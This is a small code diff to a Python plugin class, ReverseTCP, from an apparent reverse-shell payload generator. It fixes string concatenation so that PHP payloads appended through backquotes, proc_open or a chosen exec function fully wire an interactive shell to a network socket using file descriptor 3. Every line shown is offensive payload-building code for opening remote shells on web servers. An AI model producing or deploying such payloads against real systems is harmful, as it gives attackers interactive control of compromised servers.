@@ -31,7 +31,7 @@ class ReverseTCP(plugin.ReverseShell):
         if self.args.exec == "back_quote":
             self.shell += """`{} -i <&3 >&3 2>&3`;'""".format(self.args.shell)
         elif self.args.exec == "proc_open":
-            self.shell = """$proc=proc_open("{} -i",""".format(self.args.shell)
+            self.shell += """$proc=proc_open("{} -i",""".format(self.args.shell)
             self.shell += "array(0=>$sock, 1=>$sock,2=>$sock),$pipes);'"
         else:
-            self.shell = """{}("{} -i <&3 >&3 2>&3");'""".format(self.args.exec, self.args.shell)
+            self.shell += """{}("{} -i <&3 >&3 2>&3");'""".format(self.args.exec, self.args.shell)
